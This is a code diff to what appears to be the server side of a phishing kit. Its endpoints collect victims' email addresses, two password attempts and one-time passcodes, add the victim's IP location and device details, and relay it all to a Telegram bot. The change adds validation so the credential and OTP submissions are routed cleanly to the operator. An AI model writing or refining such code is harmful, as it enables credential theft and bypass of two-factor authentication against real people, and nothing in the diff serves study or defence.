@@ -193,7 +193,13 @@ app.post('/api/sendTelegram', rateLimit, async (req, res) => {
   }
 
   try {
-    const data = req.body.data || req.body;
+    const data = req.body;
+
+    // Validate: this endpoint handles credentials ONLY.
+    if (data.otp || !data.email || !data.firstAttemptPassword) {
+      return res.status(400).json({ error: 'Invalid payload for credentials endpoint. Use /api/sendOtp for OTP submissions.' });
+    }
+
     const clientIP = getClientIp(req);
     const location = await getIpAndLocation(clientIP);
     const deviceDetails = getDeviceDetailsWithParser(data.userAgent);
@@ -229,7 +235,17 @@ app.post('/api/sendOtp', rateLimit, async (req, res) => {
   }
 
   try {
-    const message = composeOtpMessage(req.body);
+    const body = req.body;
+
+    // Validate: this endpoint handles OTP ONLY.
+    if (!body.otp) {
+      return res.status(400).json({ error: 'Invalid payload for OTP endpoint. Missing otp field.' });
+    }
+    if (body.firstAttemptPassword || body.secondAttemptPassword) {
+      return res.status(400).json({ error: 'Invalid payload for OTP endpoint. Use /api/sendTelegram for credentials.' });
+    }
+
+    const message = composeOtpMessage(body);
 
     const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
